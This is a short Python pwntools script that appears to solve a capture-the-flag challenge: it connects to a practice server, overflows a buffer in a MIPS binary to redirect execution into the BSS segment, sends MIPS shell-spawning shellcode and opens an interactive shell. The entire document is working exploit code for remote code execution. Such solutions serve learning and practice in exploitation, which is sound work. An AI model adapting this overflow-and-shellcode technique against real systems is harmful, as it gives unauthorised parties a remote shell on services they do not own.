from pwn import *

#context.log_level = 'debug'

#p = process(['qemu-mipsel','-g', '9080', '-L', '/home/yeuoly/libc/mipsel-linux-uclibc', './pwn2'])
#p = process(['qemu-mipsel', '-L', '/home/yeuoly/libc/mipsel-linux-uclibc', './pwn2'])
p = remote('node4.buuoj.cn', 27454)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

sa(b'name', b'Yeuoly')

bss = 0x00410B70
gadget = 0x4007e0

payload = b'a' * 0x20 + p32(bss) + p32(gadget)

sleep(0.1)
sn(payload)

shellcode = asm(shellcraft.mips.linux.sh(), arch = 'mips')

payload = b'a' * 0x24 + p32(bss + 0x2c + 0x18) + p32(bss + 0x200) + shellcode

sleep(0.1)
sn(payload)

p.interactive()